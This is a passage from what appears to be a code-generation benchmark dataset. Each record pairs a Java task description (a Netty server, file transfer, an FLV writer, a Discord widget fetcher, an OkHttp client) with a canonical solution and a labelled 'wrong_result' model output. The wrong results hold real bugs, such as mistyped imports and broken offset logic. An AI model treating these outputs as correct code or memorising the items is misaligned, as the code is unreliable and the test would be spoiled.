{\n                putRemotingEvent(new RemotingEvent(RemotingEventType.EXCEPTION, remoteAddress, channel));\n            }\n\n            RemotingHelper.closeChannel(channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NiosocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\n\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class NettyRemotingServer {\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossSelectorGroup;\n    private final EventLoopGroup workerSelectorGroup;\n    private final DefaultEventExecutorGroup defaultEventExecutorGroup;\n    private final AppContext appContext;\n    private final Logger LOGGER;\n    private final RemotingServerConfig config;\n    private final ChannelEventListener channelEventListener;\n\n    public NettyRemotingServer(AppContext appContext, RemotingServerConfig config) {\n        this.appContext = appContext;\n        this.config = config;\n        this.serverBootstrap = new ServerBootstrap();\n        this.bossSelectorGroup = new NioEventLoopGroup(config.getBossThreadNum());\n        this.workerSelectorGroup = new NioEventLoopGroup(config.getWorkerThreadNum());\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(config.getBusinessThreadNum());\n        this.LOGGER = appContext.getLogger();\n        this.channelEventListener = null;\n    }\n\n    public NettyRemotingServer(RemotingServerConfig config, ChannelEventListener channelEventListener) {\n        this.appContext = null;\n        this.config = config;\n        this.serverBootstrap = new ServerBootstrap();\n        this.bossSelectorGroup = new NioEventLoopGroup(config.getBossThreadNum());\n        this.workerSelectorGroup = new NioEventLoopGroup(config.getWorkerThreadNum());\n        this.defaultEventExecutorGroup = new DefaultEventExecutorGroup(config.getBusinessThreadNum());\n        this.LOGGER = null;\n        this.channelEventListener = channelEventListener;\n    }\n\n    public void serverStart() {\n        try {\n            serverBootstrap.group(bossSelectorGroup, workerSelectorGroup)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_BACKLOG, 1024)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .childOption(ChannelOption.TCP_NODELAY, true)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, config.getIdleTimeSeconds(), TimeUnit.SECONDS));\n                            ch.pipeline().addLast(defaultEventExecutorGroup, new NettyConnectManageHandler(channelEventListener, LOGGER));\n                            ch.pipeline().addLast(defaultEventExecutorGroup, new NettyServerHandler(appContext, channelEventListener));\n                        }\n                    });\n\n            ChannelFuture future = serverBootstrap.bind(config.getPort()).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            LOGGER.error(\"Netty server start error\", e);\n        } finally {\n            serverShutdown();\n        }\n    }\n\n    public void serverShutdown() {\n        if (bossSelectorGroup != null) {\n            bossSelectorGroup.shutdownGracefully();\n        }\n        if (workerSelectorGroup != null) {\n            workerSelectorGroup.shutdownGracefully();\n        }\n        if (defaultEventExecutorGroup != null) {\n            defaultEventExecutorGroup.shutdownGracefully();\n        }\n    }\n\n    private static class NettyServerHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        private final AppContext appContext;\n        private final ChannelEventListener channelEventListener;\n\n        public NettyServerHandler(AppContext appContext, ChannelEventListener channelEventListener) {\n            this.appContext = appContext;\n            this.channelEventListener = channelEventListener;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) {\n            // Process the incoming command\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            ctx.close();\n        }\n    }\n\n    private static class NettyConnectManageHandler extends ChannelDuplexHandler {\n        private final ChannelEventListener channelEventListener;\n        private final Logger LOGGER;\n\n        public NettyConnectManageHandler(ChannelEventListener channelEventListener, Logger logger) {\n            this.channelEventListener = channelEventListener;\n            this.LOGGER = logger;\n        }\n\n        @Override\n        public void channelRegistered(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel registered: {}\", ctx.channel().id());\n        }\n\n        @Override\n        public void channelUnregistered(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel unregistered: {}\", ctx.channel().id());\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel active: {}\", ctx.channel().id());\n            if (channelEventListener != null) {\n                channelEventListener.onChannelActive(ctx.channel());\n            }\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            LOGGER.info(\"Channel inactive: {}\", ctx.channel().id());\n            if (channelEventListener != null) {\n                channelEventListener.onChannelInactive(ctx.channel());\n            }\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n            if (evt instanceof IdleStateEvent) {\n                LOGGER.warn(\"Channel idle: {}\", ctx.channel().id());\n                if (channelEventListener != null) {\n                    channelEventListener.onChannelIdle(ctx.channel());\n                }\n                ctx.close();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            LOGGER.error(\"Channel exception: {}\", ctx.channel().id(), cause);\n            if (channelEventListener != null) {\n                channelEventListener.onChannelException(ctx.channel(), cause);\n            }\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 22,
    "Instruction": "Task Description: Create a Java abstract class that handles file transfer operations using FileChannel for reading files and DataStreamOutput for writing data, with support for synchronization points during transfer.\n\nClass Description: TransferType is an abstract class that provides a framework for transferring file data in chunks using NIO FileChannel for reading and a DataStreamOutput for writing. It manages buffer sizes, synchronization points, and tracks transfer progress.\n\nAttributes:\n- path: String - The file path to be transferred\n- file: File - The File object representing the file to transfer\n- fileSize: long - The total size of the file in bytes\n- bufferSize: int - The size of the transfer buffer in bytes\n- syncSize: long - The interval size at which to perform synchronization\n- syncPosition: long - The current position for synchronization tracking\n\nMethods:\n- TransferType(String path, DataStream cli) - Constructor - Initializes the transfer with file path and configuration from DataStream client\n- getFile() -> File - Returns the File object being transferred\n- getBufferSize() -> int - Returns the buffer size for transfers\n- getPacketSize(long offset) -> long - Calculates the next packet size based on current offset\n- isSync(long position) -> boolean - Determines if current position requires synchronization\n- transfer(FileStoreClient client, RoutingTable routingTable) -> List<CompletableFuture<DataStreamReply>> - Performs the complete file transfer operation\n- write(FileChannel in, DataStreamOutput out, long offset, List<CompletableFuture<DataStreamReply>> futures) -> long - Abstract method to be implemented by subclasses for writing data\n- toString() -> String - Returns a string representation of the transfer object",
    "Canonical_solution": "import org.apache.ratis.examples.filestore.FileStoreClient;\nimport org.apache.ratis.io.StandardWriteOption;\nimport org.apache.ratis.protocol.DataStreamReply;\nimport org.apache.ratis.protocol.RoutingTable;\nimport org.apache.ratis.thirdparty.io.netty.buffer.ByteBuf;\nimport org.apache.ratis.thirdparty.io.netty.buffer.PooledByteBufAllocator;\nimport org.apache.ratis.util.FileUtils;\nimport org.apache.ratis.util.JavaUtils;\nimport org.apache.ratis.util.Preconditions;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.StandardOpenOption;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.CompletableFuture;\n\nabstract static class TransferType {\n    private final String path;\n    private final File file;\n    private final long fileSize;\n    private final int bufferSize;\n    private final long syncSize;\n    private long syncPosition = 0;\n\n    TransferType(String path, DataStream cli) {\n        this.path = path;\n        this.file = new File(path);\n        this.fileSize = cli.getFileSizeInBytes();\n        this.bufferSize = cli.getBufferSizeInBytes();\n        this.syncSize = cli.getSyncSize();\n\n        final long actualSize = file.length();\n        Preconditions.assertTrue(actualSize == fileSize, () -> \"Unexpected file size: expected size is \"\n                + fileSize + \" but actual size is \" + actualSize + \", path=\" + path);\n    }\n\n    File getFile() {\n        return file;\n    }\n\n    int getBufferSize() {\n        return bufferSize;\n    }\n\n    long getPacketSize(long offset) {\n        return Math.min(bufferSize, fileSize - offset);\n    }\n\n    boolean isSync(long position) {\n        if (syncSize > 0) {\n            if (position >= fileSize || position - syncPosition >= syncSize) {\n                syncPosition = position;\n                return true;\n            }\n        }\n        return false;\n    }\n\n    List<CompletableFuture<DataStreamReply>> transfer(\n            FileStoreClient client, RoutingTable routingTable) throws IOException {\n        if (fileSize <= 0) {\n            return Collections.emptyList();\n        }\n\n        final List<CompletableFuture<DataStreamReply>> futures = new ArrayList<>();\n        final DataStreamOutput out = client.getStreamOutput(file.getName(), fileSize, routingTable);\n        try (FileChannel in = FileUtils.newFileChannel(file, StandardOpenOption.READ)) {\n            for (long offset = 0L; offset < fileSize; ) {\n                offset += write(in, out, offset, futures);\n            }\n        } catch (Throwable e) {\n            throw new IOException(\"Failed to transfer \" + path);\n        } finally {\n            futures.add(out.closeAsync());\n        }\n        return futures;\n    }\n\n    abstract long write(FileChannel in, DataStreamOutput out, long offset,\n                       List<CompletableFuture<DataStreamReply>> futures) throws IOException;\n\n    @Override\n    public String toString() {\n        return JavaUtils.getClassSimpleName(getClass()) + \"{\" + path + \", size=\" + fileSize + \"}\";\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.util.List;\nimport java.util.concurrent.CompletableFuture;\n\npublic abstract class TransferType {\n    protected String path;\n    protected File file;\n    protected long fileSize;\n    protected int bufferSize;\n    protected long syncSize;\n    protected long syncPosition;\n\n    public TransferType(String path, DataStream cli) throws IOException {\n        this.path = path;\n        this.file = new File(path);\n        this.fileSize = file.length();\n        this.bufferSize = cli.getBufferSize();\n        this.syncSize = cli.getSyncInterval();\n        this.syncPosition = 0;\n    }\n\n    public File getFile() {\n        return file;\n    }\n\n    public int getBufferSize() {\n        return bufferSize;\n    }\n\n    public long getPacketSize(long offset) {\n        if (offset + bufferSize > fileSize) {\n            return fileSize - offset;\n        }\n        return bufferSize;\n    }\n\n    public boolean isSync(long position) {\n        return position >= syncPosition + syncSize;\n    }\n\n    public List<CompletableFuture<DataStreamReply>> transfer(FileStoreClient client, RoutingTable routingTable) throws IOException {\n        try (FileChannel in = FileChannel.open(file.toPath())) {\n            List<CompletableFuture<DataStreamReply>> futures = client.initTransfer(routingTable, file.getName(), fileSize);\n            long offset = 0;\n            while (offset < fileSize) {\n                write(in, client.getOutputStream(), offset, futures);\n                offset += bufferSize;\n            }\n            return futures;\n        }\n    }\n\n    public abstract long write(FileChannel in, DataStreamOutput out, long offset, List<CompletableFuture<DataStreamReply>> futures) throws IOException;\n\n    @Override\n    public String toString() {\n        return \"TransferType{path='\" + path + \"', fileSize=\" + fileSize + \"}\";\n    }\n}\n```"
  },
  {
    "Task_id": 23,
    "Instruction": "Task Description: Create a Java class for writing FLV (Flash Video) files using Java NIO's FileChannel and ByteBuffer for efficient file operations. The class should handle both new file creation and appending to existing files, including metadata management.\n\nClass Description: The FLVWriter class provides functionality to write FLV video files with proper headers, metadata tags, and media data tags. It uses Java NIO channels and buffers for efficient file operations, supporting both new file creation and appending to existing files while maintaining FLV format specifications.\n\nAttributes:\n- fileChannel: [SeekableByteChannel] - Channel for writing the final FLV output file\n- dataChannel: [SeekableByteChannel] - Temporary channel for storing tags before finalization\n- filePath: [String] - Path to the output FLV file\n- append: [boolean] - Flag indicating whether to append to an existing file\n- appendOffset: [long] - Position in existing file where new data should be appended\n- meta: [Map<String, ?>] - Metadata extracted from existing FLV file when appending\n\nMethods:\n- FLVWriter(String filePath) -> [void] - Constructor that initializes the writer with a file path for new file creation\n- FLVWriter(Path path, boolean append) -> [void] - Constructor that initializes the writer with append mode and handles existing file metadata\n- getMetaData(Path path, int maxTags) -> [Map<String, ?>] - Extracts metadata from an existing FLV file (private method)\n- createDataFile() -> [void] - Creates a temporary data file for storing tags (private method)\n- createOutputFile() -> [void] - Creates the final output FLV file (private method)\n- writeTag(ITag tag) -> [boolean] - Writes a media tag to the temporary data file\n- close() -> [void] - Finalizes the FLV file and cleans up resources\n- finalizeFlv() -> [long] - Combines temporary data with existing file (if appending) and writes final FLV file (private method)",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Map;\n\npublic class FLVWriter {\n\n    private static final Logger log = LoggerFactory.getLogger(FLVWriter.class);\n\n    private SeekableByteChannel fileChannel;\n    private SeekableByteChannel dataChannel;\n    private String filePath;\n    private boolean append;\n    private long appendOffset = 13L;\n    private Map<String, ?> meta;\n\n    public FLVWriter(String filePath) {\n        this.filePath = filePath;\n        try {\n            createDataFile();\n        } catch (Exception e) {\n            log.error(\"Failed to create FLV writer\", e);\n        }\n    }\n\n    public FLVWriter(Path path, boolean append) {\n        filePath = path.toFile().getAbsolutePath();\n        this.append = append;\n        try {\n            if (append) {\n                meta = getMetaData(path, 5);\n                Files.move(path, path.resolveSibling(path.toFile().getName().replace(\".flv\", \".old\")));\n            }\n            createDataFile();\n        } catch (Exception e) {\n            log.error(\"Failed to create FLV writer\", e);\n        }\n    }\n\n    private Map<String, ?> getMetaData(Path path, int maxTags) throws IOException {\n        Map<String, ?> meta = null;\n        try (SeekableByteChannel channel = Files.newByteChannel(path, StandardOpenOption.READ)) {\n            long size = channel.size();\n            if (size > 0L) {\n                channel.position(appendOffset);\n                ByteBuffer dst = ByteBuffer.allocate(11);\n                do {\n                    int read = channel.read(dst);\n                    if (read > 0) {\n                        dst.flip();\n                        byte tagType = (byte) (dst.get() & 31);\n                        int bodySize = IOUtils.readUnsignedMediumInt(dst);\n                        if (tagType == ITag.TYPE_METADATA) {\n                            ByteBuffer buf = ByteBuffer.allocate(bodySize);\n                            read = channel.read(buf);\n                            if (read > 0) {\n                                buf.flip();\n                                Input input = new Input(IoBuffer.wrap(buf));\n                                String metaType = Deserializer.deserialize(input, String.class);\n                                meta = Deserializer.deserialize(input, Map.class);\n                                if (meta.containsKey(\"duration\")) {\n                                    appendOffset = channel.position() + 4L;\n                                    break;\n                                }\n                            }\n                            buf.compact();\n                        }\n                        channel.position(channel.position() + 4L);\n                        dst.compact();\n                    }\n                } while (--maxTags > 0);\n            }\n        }\n        return meta;\n    }\n\n    private void createDataFile() throws IOException {\n        Path path = Paths.get(filePath + \".ser\");\n        if (Files.deleteIfExists(path)) {\n            log.debug(\"Previous flv data file existed and was removed\");\n        }\n        this.dataChannel = Files.newByteChannel(path, StandardOpenOption.CREATE_NEW, StandardOpenOption.WRITE, StandardOpenOption.READ);\n    }\n\n    private void createOutputFile() throws IOException {\n        this.fileChannel = Files.newByteChannel(Paths.get(filePath), StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);\n    }\n\n    public boolean writeTag(ITag tag) throws IOException {\n        try {\n            int bodySize = tag.getBodySize();\n            byte dataType = tag.getDataType();\n            IoBuffer tagBody = tag.getBody();\n            int totalTagSize = 11 + bodySize + 4;\n            ByteBuffer tagBuffer = ByteBuffer.allocate(totalTagSize);\n            int timestamp = tag.getTimestamp();\n            byte[] bodyBuf = new byte[bodySize];\n            tagBody.get(bodyBuf);\n            IOUtils.writeUnsignedByte(tagBuffer, dataType);\n            IOUtils.writeMediumInt(tagBuffer, bodySize);\n            IOUtils.writeExtendedMediumInt(tagBuffer, timestamp);\n            tagBuffer.put(new byte[] {0, 0, 0});\n            tagBuffer.put(bodyBuf);\n            tagBuffer.putInt(11 + bodySize);\n            tagBuffer.flip();\n            dataChannel.write(tagBuffer);\n            return true;\n        } catch (Exception e) {\n            log.error(\"Failed to write tag\", e);\n            return false;\n        }\n    }\n\n    public void close() {\n        try {\n            finalizeFlv();\n        } catch (Exception e) {\n            log.error(\"Failed to finalize FLV\", e);\n        } finally {\n            try {\n                if (dataChannel != null) dataChannel.close();\n                if (fileChannel != null) fileChannel.close();\n            } catch (IOException e) {\n                log.error(\"Failed to close channels\", e);\n            }\n        }\n    }\n\n    private long finalizeFlv() throws IOException {\n        createOutputFile();\n        writeHeader();\n        writeMetadataTag();\n        ByteBuffer dst = ByteBuffer.allocate(1024);\n        if (append) {\n            Path prevFlv = Paths.get(filePath.replace(\".flv\", \".old\"));\n            if (Files.exists(prevFlv)) {\n                try (SeekableByteChannel prevChannel = Files.newByteChannel(prevFlv, StandardOpenOption.READ)) {\n                    prevChannel.position(appendOffset);\n                    int read;\n                    do {\n                        read = prevChannel.read(dst);\n                        if (read > 0) {\n                            dst.flip();\n                            fileChannel.write(dst);\n                            dst.compact();\n                        }\n                    } while (read > 0);\n                }\n                Files.deleteIfExists(prevFlv);\n            }\n        }\n        dataChannel.position(0L);\n        int read;\n        do {\n            read = dataChannel.read(dst);\n            if (read > 0) {\n                dst.flip();\n                fileChannel.write(dst);\n                dst.compact();\n            }\n        } while (read > 0);\n        Files.deleteIfExists(Paths.get(filePath + \".ser\"));\n        return fileChannel.position();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.*;\nimport java.nio.file.attribute.BasicFileAttributes;\nimport java.util.Map;\n\npublic class FLVWriter {\n    private SeekableByteChannel fileChannel;\n    private SeekableByteChannel dataChannel;\n    private String filePath;\n    private boolean append;\n    private long appendOffset;\n    private Map<String, ?> meta;\n\n    public FLVWriter(String filePath) throws IOException {\n        this.filePath = filePath;\n        this.append = false;\n        createDataFile();\n        createOutputFile();\n    }\n\n    public FLVWriter(Path path, boolean append) throws IOException {\n        this.filePath = path.toString();\n        this.append = append;\n        if (append) {\n            this.meta = getMetaData(path, 10);\n            this.appendOffset = Files.size(path);\n            this.dataChannel = FileChannel.open(Paths.get(filePath + \".tmp\"), StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        } else {\n            createDataFile();\n            createOutputFile();\n        }\n    }\n\n    private Map<String, Object> getMetaData(Path path, int maxTags) throws IOException {\n        // Placeholder for metadata extraction logic\n        return null;\n    }\n\n    private void createDataFile() throws IOException {\n        Path tempPath = Paths.get(filePath + \".tmp\");\n        dataChannel = FileChannel.open(tempPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n    }\n\n    private void createOutputFile() throws IOException {\n        Path outputPath = Paths.get(filePath);\n        fileChannel = FileChannel.open(outputPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        ByteBuffer header = ByteBuffer.wrap(new byte[] {\n            'F', 'L', 'V', 1, 0x05, 0, 0, 0, 9\n        });\n        fileChannel.write(header);\n    }\n\n    public boolean writeTag(ITag tag) throws IOException {\n        ByteBuffer buffer = tag.toByteBuffer();\n        dataChannel.write(buffer);\n        return true;\n    }\n\n    public void close() throws IOException {\n        finalizeFlv();\n        if (dataChannel != null) {\n            dataChannel.close();\n        }\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    private long finalizeFlv() throws IOException {\n        if (append) {\n            fileChannel.position(appendOffset);\n        }\n        // Write tags from dataChannel to fileChannel\n        ByteBuffer buffer = ByteBuffer.allocateDirect(4096);\n        while (dataChannel.read(buffer) > 0) {\n            buffer.flip();\n            fileChannel.write(buffer);\n            buffer.clear();\n        }\n        return fileChannel.size();\n    }\n}\n```"
  },
  {
    "Task_id": 237,
    "Instruction": "Task Description: Create a utility class for retrieving Discord guild widget information using HTTP requests.\n\nClass Description: WidgetUtil is a utility class that provides functionality to fetch Discord guild widget data through REST API calls. It handles HTTP communication, response processing, and error handling for widget retrieval operations.\n\nAttributes:\nWIDGET_URL: [String] - The URL template for accessing Discord guild widget JSON data, using the default REST API base URL.\n\nMethods:\ngetWidget: [getWidget]([long guildId]) -> [Widget] - Retrieves the widget information for a specified Discord guild ID. Handles various HTTP response codes including success (200), not found (404), forbidden (403), and rate limiting (429). Throws RateLimitedException when rate limited and UncheckedIOException for IO errors. Returns null if the widget doesn't exist or is inaccessible.",
    "Canonical_solution": "import net.dv8tion.jda.api.entities.Widget;\nimport net.dv8tion.jda.api.exceptions.RateLimitedException;\nimport net.dv8tion.jda.api.requests.RestConfig;\nimport net.dv8tion.jda.api.utils.data.DataObject;\nimport net.dv8tion.jda.internal.entities.WidgetImpl;\nimport net.dv8tion.jda.internal.utils.Checks;\nimport net.dv8tion.jda.internal.utils.IOUtil;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\n\nimport javax.annotation.Nonnull;\nimport javax.annotation.Nullable;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.UncheckedIOException;\n\npublic class WidgetUtil \n{\n    public static final String WIDGET_URL = RestConfig.DEFAULT_BASE_URL + \"guilds/%s/widget.json\";\n\n    @Nullable\n    public static Widget getWidget(long guildId) throws RateLimitedException\n    {\n        Checks.notNull(guildId, \"GuildId\");\n\n        OkHttpClient client = new OkHttpClient.Builder().build();\n        Request request = new Request.Builder()\n                    .url(String.format(WIDGET_URL, guildId))\n                    .method(\"GET\", null)\n                    .header(\"user-agent\", RestConfig.USER_AGENT)\n                    .header(\"accept-encoding\", \"gzip\")\n                    .build();\n\n        try (Response response = client.newCall(request).execute())\n        {\n            final int code = response.code();\n            InputStream data = IOUtil.getBody(response);\n\n            switch (code)\n            {\n                case 200:\n                    try (InputStream stream = data)\n                    {\n                        return new WidgetImpl(DataObject.fromJson(stream));\n                    }\n                    catch (IOException e)\n                    {\n                        throw new UncheckedIOException(e);\n                    }\n                case 400:\n                case 404:\n                    return null;\n                case 403:\n                    return new WidgetImpl(guildId);\n                case 429:\n                    long retryAfter;\n                    try (InputStream stream = data)\n                    {\n                        retryAfter = DataObject.fromJson(stream).getLong(\"retry_after\");\n                    }\n                    catch (Exception e)\n                    {\n                        retryAfter = 0;\n                    }\n                    throw new RateLimitedException(WIDGET_URL, retryAfter);\n                default:\n                    throw new IllegalStateException(\"An unknown status was returned: \" + code + \" \" + response.message());\n            }\n        }\n        catch (IOException e)\n        {\n            throw new UncheckedIOException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class WidgetUtil {\n    private static final String WIDGET_URL = \"https://discord.com/api/guilds/%d/widget.json\";\n\n    public static Widget getWidget(long guildId) {\n        try {\n            URL url = new URL(String.format(WIDGET_URL, guildId));\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            int responseCode = connection.getResponseCode();\n\n            if (responseCode == 429) {\n                throw new RateLimitedException(\"Rate limited by Discord API.\");\n            } else if (responseCode >= 400 && responseCode < 600) {\n                return null;\n            }\n\n            try (InputStream inputStream = connection.getInputStream();\n                 Scanner scanner = new Scanner(inputStream)) {\n                StringBuilder response = new StringBuilder();\n                while (scanner.hasNextLine()) {\n                    response.append(scanner.nextLine());\n                }\n                return new Gson().fromJson(response.toString(), Widget.class);\n            }\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to retrieve widget data.\", e);\n        }\n    }\n\n    public static class RateLimitedException extends RuntimeException {\n        public RateLimitedException(String message) {\n            super(message);\n        }\n    }\n\n    public static class Widget {\n        private String name;\n        private String instantInvite;\n        private Channel[] channels;\n        private Member[] members;\n        private boolean presenceCount;\n\n        // Getters and setters for all fields\n\n        public String getName() {\n            return name;\n        }\n\n        public void setName(String name) {\n            this.name = name;\n        }\n\n        public String getInstantInvite() {\n            return instantInvite;\n        }\n\n        public void setInstantInvite(String instantInvite) {\n            this.instantInvite = instantInvite;\n        }\n\n        public Channel[] getChannels() {\n            return channels;\n        }\n\n        public void setChannels(Channel[] channels) {\n            this.channels = channels;\n        }\n\n        public Member[] getMembers() {\n            return members;\n        }\n\n        public void setMembers(Member[] members) {\n            this.members = members;\n        }\n\n        public boolean isPresenceCount() {\n            return presenceCount;\n        }\n\n        public void setPresenceCount(boolean presenceCount) {\n            this.presenceCount = presenceCount;\n        }\n    }\n\n    public static class Channel {\n        private long id;\n        private String name;\n        private long position;\n\n        // Getters and setters for all fields\n\n        public long getId() {\n            return id;\n        }\n\n        public void setId(long id) {\n            this.id = id;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public void setName(String name) {\n            this.name = name;\n        }\n\n        public long getPosition() {\n            return position;\n        }\n\n        public void setPosition(long position) {\n            this.position = position;\n        }\n    }\n\n    public static class Member {\n        private User user;\n        private String status;\n        private Activity[] activities;\n        private ClientStatus clientStatus;\n\n        // Getters and setters for all fields\n\n        public User getUser() {\n            return user;\n        }\n\n        public void setUser(User user) {\n            this.user = user;\n        }\n\n        public String getStatus() {\n            return status;\n        }\n\n        public void setStatus(String status) {\n            this.status = status;\n        }\n\n        public Activity[] getActivities() {\n            return activities;\n        }\n\n        public void setActivities(Activity[] activities) {\n            this.activities = activities;\n        }\n\n        public ClientStatus getClientStatus() {\n            return clientStatus;\n        }\n\n        public void setClientStatus(ClientStatus clientStatus) {\n            this.clientStatus = clientStatus;\n        }\n    }\n\n    public static class User {\n        private String username;\n        private String discriminator;\n        private String avatar;\n\n        // Getters and setters for all fields\n\n        public String getUsername() {\n            return username;\n        }\n\n        public void setUsername(String username) {\n            this.username = username;\n        }\n\n        public String getDiscriminator() {\n            return discriminator;\n        }\n\n        public void setDiscriminator(String discriminator) {\n            this.discriminator = discriminator;\n        }\n\n        public String getAvatar() {\n            return avatar;\n        }\n\n        public void setAvatar(String avatar) {\n            this.avatar = avatar;\n        }\n    }\n\n    public static class Activity {\n        private String name;\n        private String type;\n\n        // Getters and setters for all fields\n\n        public String getName() {\n            return name;\n        }\n\n        public void setName(String name) {\n            this.name = name;\n        }\n\n        public String getType() {\n            return type;\n        }\n\n        public void setType(String type) {\n            this.type = type;\n        }\n    }\n\n    public static class ClientStatus {\n        private String desktop;\n        private String mobile;\n        private String web;\n\n        // Getters and setters for all fields\n\n        public String getDesktop() {\n            return desktop;\n        }\n\n        public void setDesktop(String desktop) {\n            this.desktop = desktop;\n        }\n\n        public String getMobile() {\n            return mobile;\n        }\n\n        public void setMobile(String mobile) {\n            this.mobile = mobile;\n        }\n\n        public String getWeb() {\n            return web;\n        }\n\n        public void setWeb(String web) {\n            this.web = web;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 238,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using OkHttp library, supporting both regular and DNS-over-HTTPS (DoH) connections, with caching capabilities and custom DNS fallback mechanisms.\n\nClass Description: The HttpClient class provides static methods for performing HTTP GET and POST requests with configurable caching and DNS options. It maintains four different client configurations (regular/DoH with/without cache) and handles response processing with error checking.\n\nAttributes:\n- httpClient: [OkHttpClient] - Standard HTTP client without cache\n- httpClientDoH: [OkHttpClient] - HTTP client with DNS-over-HTTPS support\n- httpClientWithCache: [OkHttpClient] - HTTP client with caching enabled\n- httpClientWithCacheDoH: [OkHttpClient] - HTTP client with both caching and DoH\n- fallbackDNS: [FallBackDNS] - Custom DNS resolver with fallback functionality\n- doh: [boolean] - Flag indicating whether DoH is enabled\n\nMethods:\n- getHttpClient() -> [OkHttpClient] - Returns appropriate HTTP client based on DoH setting\n- getHttpClientWithCache() -> [OkHttpClient] - Returns cached HTTP client based on DoH setting\n- doHttpGet(String url, boolean allowCache) -> [byte[]] - Performs HTTP GET request and returns response body as bytes\n- doHttpPost(String url, String data, boolean allowCache) -> [byte[]] - Performs HTTP POST request with JSON payload and returns response body as bytes\n- followRedirects(OkHttpClient.Builder builder, boolean followRedirects) -> [OkHttpClient.Builder] - Configures redirect following behavior for client builder\n- checkNeedCaptchaAndroidacy(String url, int errorCode) -> [void] - Checks if Androidacy URL requires captcha\n- JsonRequestBody: [static inner class] - Custom RequestBody implementation for JSON data\n\nStatic Initialization Block:\n- Initializes all HTTP client configurations with timeout settings, proxy configuration, and DNS setup (including DoH fallback)",
    "Canonical_solution": "import android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.net.Uri;\nimport android.os.Handler;\nimport android.os.Looper;\n\nimport com.fox2code.mmm.MainApplication;\nimport com.fox2code.mmm.R;\nimport com.fox2code.mmm.androidacy.AndroidacyUtil;\n\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\n\nimport javax.net.ssl.SSLException;\n\nimport okhttp3.Cache;\nimport okhttp3.Dns;\nimport okhttp3.HttpUrl;\nimport okhttp3.MediaType;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.RequestBody;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport okhttp3.dnsoverhttps.DnsOverHttps;\nimport okhttp3.logging.HttpLoggingInterceptor;\nimport okio.BufferedSink;\nimport timber.log.Timber;\n\npublic class HttpClient {\n    private static final OkHttpClient httpClient;\n    private static final OkHttpClient httpClientDoH;\n    private static final OkHttpClient httpClientWithCache;\n    private static final OkHttpClient httpClientWithCacheDoH;\n    private static final FallBackDNS fallbackDNS;\n    private static boolean doh;\n\n    static {\n        MainApplication mainApplication = MainApplication.getINSTANCE();\n        OkHttpClient.Builder httpclientBuilder = new OkHttpClient.Builder();\n        httpclientBuilder.connectTimeout(5, TimeUnit.SECONDS);\n        httpclientBuilder.writeTimeout(10, TimeUnit.SECONDS);\n        httpclientBuilder.readTimeout(15, TimeUnit.SECONDS);\n        